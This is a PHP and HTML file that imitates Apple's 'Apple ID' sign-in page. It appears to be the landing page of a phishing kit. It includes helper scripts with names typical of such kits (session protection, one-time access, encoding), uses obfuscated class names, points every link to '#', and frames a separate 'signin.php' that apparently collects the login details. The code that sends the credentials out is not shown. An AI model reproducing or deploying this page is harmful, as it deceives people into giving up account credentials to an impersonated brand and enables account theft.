<?php
error_reporting(E_ERROR);
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/language.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require_once "assets/includes/apxdev.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?=tr('Sign In')?></title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol">
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
</li>
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav>
<div class="subnav">
<div class="container">
<div class="title pull-left">Apple&nbsp;ID</div>
<div class="menu-wrapper pull-right">
<ul class="menu">
<li class="item active"><a class="btn btn-link btn-signin" href="#"><?=tr('Sign In')?></a></li>
<li class="item"><a class="btn btn-link btn-create" href="#"><?=tr('Create Your Apple ID')?></a></li>
<li class="item"><a class="btn btn-link btn-faq" href="#"><?=tr('FAQ')?></a></li>
</ul>
</div>
</div>
</div>
<div class="paws signin">
<h1 class="LoginTitle">Apple&nbsp;ID</h1>
<div class="LoginIframe" id="auth-container" style="position: relative;">
<iframe width="100%" height="100%" name="login" id="login" src="assets/signin.php" frameborder="0" scrolling="no"></iframe>
</div>
</div>
<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="container">
<div class="forgot" id="forgot-link"><a href="#"><?=tr('Forgot Apple ID or password?')?></a></div>
<div class="flex home-content">
<h2 id="Title" class="title separator"><?=tr('Your account for everything Apple.')?></h2>
<div id="TitleMsg" class="intro"><?=tr('A single Apple ID and password gives you access to all Apple services.');?></div>
<div id="LearnMore" class="intro"><a class="button faq-link" href="#"><?=tr('Learn more about Apple ID');?> <i class="icon Righty"></i></a></div>
<div id="AppIconsWrapper" class="apps text-center"><img class="ApplicationIcons" src="assets/img/icons.jpg" height="68" width="656"></div>
<div id="CreateAccount" class="intro create show"><a class="button create-link" href="#"><?=tr('Create your Apple ID');?><i class="icon Righty"></i></a></div>
</div>
</div>
</div>
</div>
<footer>
<div class="container">
<div class="footer">
<div class="footer-wrap">
<div class="FooterLine1">
<div class="line-level">Shop the <a href="#">Apple Online Store</a> (<?php echo $langx['APPCALL'];?>), visit an <a href="#">Apple Retail Store</a>, or find a <a href="#">reseller</a>.</div>
</div>
<div class="FooterLine2">
<ul class="menu">
<li class="item"><a href="#">Apple Info</a></li>
<li class="item"><a href="#">Site Map</a></li>
<li class="item"><a href="#">Hot News</a></li>
<li class="item"><a href="#">RSS Feeds</a></li>
<li class="item"><a href="#">Contact Us</a></li>
<li class="item"><a class="choose" href="#"><img height="22" src="<?php echo $langx['FLAG'];?>" width="22"></a></li>
</ul>
</div>
<div class="FooterLine3">Copyright -® 2018 Apple Inc. All rights reserved.
<ul class="menu">
<li class="item"><a href="#">Terms of Use</a></li>
<li class="item"><a href="#">Privacy Policy</a></li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</body>
</html>